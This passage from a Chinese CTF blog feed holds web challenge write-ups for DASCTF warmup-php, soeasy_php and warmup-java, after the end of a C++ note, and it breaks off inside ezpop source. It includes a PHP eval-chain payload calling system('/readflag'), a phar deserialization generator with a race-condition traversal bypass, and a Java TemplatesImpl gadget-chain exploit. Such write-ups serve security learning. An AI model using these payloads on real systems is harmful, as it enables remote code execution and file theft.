p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p = <span class="built_in">test1</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//    1.使用一个创建完毕的对象来初始化一个新对象</span></span><br><span class="line">    Person p1;</span><br><span class="line">    Person p2 = <span class="built_in">test1</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//    2.值传递的方式给函数参数传值</span></span><br><span class="line">    <span class="comment">// test(p1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    3.值方式返回局部对象</span></span><br><span class="line">    <span class="comment">// Person p3 = test1();</span></span><br><span class="line">    <span class="comment">// test2();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>语言学习</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF Apr X FATE 防疫挑战赛 web</title>
    <url>/2022/04/27/DASCTF-Apr-X-FATE-%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B-web/</url>
    <content><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><blockquote>
<p>上周末四场比赛，由于一开始MRCTF太坐牢了，一直在打DAS，周日调休满课<del>（主要是在补作业）</del>胖哈勃和网刃也都只看了一点，心累，忙里偷闲赶紧复现一下（</p>
</blockquote>
<span id="more"></span>

<h3 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h3><p>下载附件，有四个类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;./class/&quot;</span>.<span class="variable">$class</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">            <span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$object</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Action(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过传参实例化一个类，如果这个类当前不存在则通过<code>spl_autoload_register</code>包含类文件，通过<code>properties</code>给类里面的某些属性赋值，最后执行run方法</p>
<p>之后直接去审计class目录下的四个类，我们可以发现都没有构造方法（<code>__construct</code>），所以只能从<code>run</code>入手，然后在<code>Base</code>类中可以找到我们特别想调用的方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evaluateExpression</span>(<span class="params"><span class="variable">$_expression_</span>,<span class="variable">$_data_</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_string(<span class="variable">$_expression_</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            extract(<span class="variable">$_data_</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="string">&#x27;return &#x27;</span>.<span class="variable">$_expression_</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$_data_</span>[]=<span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(<span class="variable">$_expression_</span>, <span class="variable">$_data_</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>那么现在就要找最终可以调用到<code>evaluateExpression</code>方法的链子了</p>
<p>先去看<code>ListView-&gt;run</code>，调用到了<code>renderContent</code>，并通过<code>renderSection</code>方法对<code>$this-&gt;template</code>正则匹配操作，而<code>renderSection</code>判断正则匹配到的<code>renderxxx</code>是否存在方法，存在则直接调用该方法，之后就要去找可利用的方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;renderContent();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderContent</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace_callback(<span class="string">&quot;/&#123;(\w+)&#125;/&quot;</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="string">&#x27;renderSection&#x27;</span>),<span class="keyword">$this</span>-&gt;template);</span><br><span class="line">        ob_end_flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">renderSection</span>(<span class="params"><span class="variable">$matches</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$method</span>=<span class="string">&#x27;render&#x27;</span>.<span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>,<span class="variable">$method</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;<span class="variable">$method</span>();</span><br><span class="line">            <span class="variable">$html</span>=ob_get_contents();</span><br><span class="line">            ob_clean();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以在<code>TeseView</code>中发现可以利用的方法，并且这个类还继承了<code>ListView</code>类</p>
<p>这里又要回到前面，我们需要调用到<code>evaluateExpression</code>，所以就直接去找可以调用到这个方法，找到<code>renderTableRow</code>，只要<code>$this-&gt;rowHtmlOptionsExpression</code>为我们的命令就可以直接执行了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableRow</span>(<span class="params"><span class="variable">$row</span></span>) // 这里我们使用第一个<span class="title">if</span>语句调用，因为比较好利用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$htmlOptions</span>=<span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression!==<span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data[<span class="variable">$row</span>];</span><br><span class="line">            <span class="variable">$options</span>=<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression,<span class="keyword">array</span>(<span class="string">&#x27;row&#x27;</span>=&gt;<span class="variable">$row</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line">            <span class="keyword">if</span>(is_array(<span class="variable">$options</span>))</span><br><span class="line">                <span class="variable">$htmlOptions</span> = <span class="variable">$options</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       ……</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableBody</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        <span class="variable">$n</span>=count(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;tbody&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$n</span>&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$row</span>=<span class="number">0</span>;<span class="variable">$row</span>&lt;<span class="variable">$n</span>;++<span class="variable">$row</span>)</span><br><span class="line">                <span class="keyword">$this</span>-&gt;renderTableRow(<span class="variable">$row</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ListView#run-&gt;ListView#renderContent-&gt;LiseView#renderSection-&gt;renderTableBody-&gt;TestView#renderTableRow-&gt;Base#evaluateExpression</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get:</span><br><span class="line">action=TestView</span><br><span class="line">post:</span><br><span class="line">properties[rowHtmlOptionsExpression]=system(&#x27;/readflag&#x27;)</span><br><span class="line">&amp;properties[template]=&#123;TableBody&#125;</span><br><span class="line">&amp;properties[data]=1</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/cc58a52e404541618bed1d1ecaebf139.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<blockquote>
<p>又又又又来复现了</p>
</blockquote>
<h3 id="soeasy-php"><a href="#soeasy-php" class="headerlink" title="soeasy_php"></a>soeasy_php</h3><ul>
<li>条件竞争</li>
</ul>
<p>有元素被隐藏了，直接去<code>edit.php</code></p>
<p><img src="https://img-blog.csdnimg.cn/82f48fbefc5148a08ac743e27a61a62b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><code>png</code>处存在任意文件读取漏洞</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">png=../edit.php&amp;flag=</span><br></pre></td></tr></table></figure>

<p>然后查看<code>uploads/head.png</code>就可以得到源码（不过这个是看别的师傅的wp审计源码发现的，但不知道别的师傅是不是这样发现的：</p>
<p><code>edit.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;error_reporting&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//ä»¥rootæéå¤å¶/flag å° /tmp/flag.txtï¼å¹¶chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filewrite</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">        file_put_contents(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = fread(<span class="variable">$f</span>, filesize(<span class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$contents</span>,<span class="string">&quot;flag&#123;&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            filewrite(<span class="variable">$filename</span>,<span class="string">&quot;Don&#x27;t give me flag!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> == <span class="string">&quot;Give me flag&quot;</span>) &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;Don&#x27;t give me flag&quot;</span>);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="variable">$flag</span>);  <span class="comment">//ä¸ç»æçæèªå·±åä¸ªflagã</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$head</span> = <span class="string">&quot;uploads/head.png&quot;</span>;</span><br><span class="line">        unlink(<span class="variable">$head</span>);</span><br><span class="line">        <span class="keyword">if</span> (symlink(<span class="variable">$filename</span>, <span class="variable">$head</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æåæ´æ¢å¤´å&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;éæ­£å¸¸æä»¶ï¼å·²è¢«å é¤&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>upload.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸ä¼ å¤´å&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$filename</span> = md5(<span class="string">&quot;png&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;uploads/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">if</span>(move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ä¸ä¼ æåï¼ &quot;</span>.<span class="variable">$path</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>重点还是要看<code>edit.php</code></p>
<h4 id="非预期："><a href="#非预期：" class="headerlink" title="非预期："></a>非预期：</h4><p>简单审计一下：</p>
<p>1.第一个if语句ban掉了php协议和phar协议</p>
<p>2.第二个if语句通过symlink将我们传入的png与<code>uplaod/head.png</code>链接，导致可以任意文件读取</p>
<p>3.flag类的copyflag方法将根目录下的flag传到<code>/tmp/flag.txt</code>，并且使得<code>www-data</code>所有</p>
<p>因为存在类，而我们又想调用这个类的copyflag方法，而这个类在<code>__destruct</code>会自动调用，这里又没有明显的反序列化触发点，但又很多文件操作的函数，那就直接用<code>phar</code>协议吧</p>
<p>由于第一个if直接会正则匹配到<code>phar</code>，那就只能看后面了，本地测试之后发现可以利用<code>unlink</code>，所以现在要使得<code>symlink($filename, $head)</code>为flase就好了</p>
<p>phar：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//ä»¥rootæéå¤å¶/flag å° /tmp/flag.txtï¼å¹¶chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> flag();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;symlink.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="comment">// phar://uploads/b143915ffb6ca6b19dff97b6a93389f0.png</span></span><br></pre></td></tr></table></figure>

<p>上传之后，记录下文件的路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar://uploads/b143915ffb6ca6b19dff97b6a93389f0.png</span><br></pre></td></tr></table></figure>

<p>可以利用bp的intruder 条件竞争执行phar协议，用<code>../edit.php</code>测试的时候虽然成功了，并且我们也可以发现<code>/uploads/head.png</code>里面的内容也变成了<code>edit.php</code>的内容，但是由于想要得到<code>/tmp/flag.txt</code>内容的时候因为正则没有匹配到，直接判断文件里面存在flag，使得flag被覆盖了</p>
<p>所以我们可以构造<code>..//../../../../../tmp/flag.txt</code>，<code>//</code>用于绕过正则匹配</p>
<p><img src="https://img-blog.csdnimg.cn/53cf933879274312ab5c8e20b90d92c0.png" alt="img"></p>
<blockquote>
<p>听说这不是预期解，等之后学习一下</p>
</blockquote>
<h3 id="warmup-java"><a href="#warmup-java" class="headerlink" title="warmup-java"></a>warmup-java</h3><blockquote>
<p>复现来啦……</p>
</blockquote>
<p>学java有一段时间了，现在来看看欸嘿……</p>
<p>下载jar包，可以先看pom.xml，发现没有其他另外的依赖，再去看看类</p>
<p>emmmmm，和刚做过的<a href="https://ameuu.github.io/2022/07/22/JavaDeserializeLabs/">lab9</a>，一模一样，直接用那个exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab9;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.warmup.MyInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lab1.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">        MyInvocationHandler handler = <span class="keyword">new</span> MyInvocationHandler();</span><br><span class="line">        setField(handler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">        Comparator proxy = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Comparator.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setField(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;templates, <span class="number">1</span>&#125;);</span><br><span class="line">        setField(priorityQueue, <span class="string">&quot;comparator&quot;</span>, proxy);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(priorityQueue);</span><br><span class="line">        System.out.println(Utils.bytesTohexString(bos.toByteArray()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://erroratao.github.io/writeup/DASCTF2022_4th/">atao</a></p>
<p><a href="http://www.snowywar.top/?p=3077">雪殇姐姐</a></p>
]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>das</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF x SU 月赛</title>
    <url>/2022/03/30/DASCTF-x-SU-%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0%E4%B8%AD/</url>
    <content><![CDATA[<blockquote>
<p>ezpop、calc、upgdstore</p>
</blockquote>
<span id="more"></span>

<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h4><p>直接得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;v1(<span class="keyword">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span 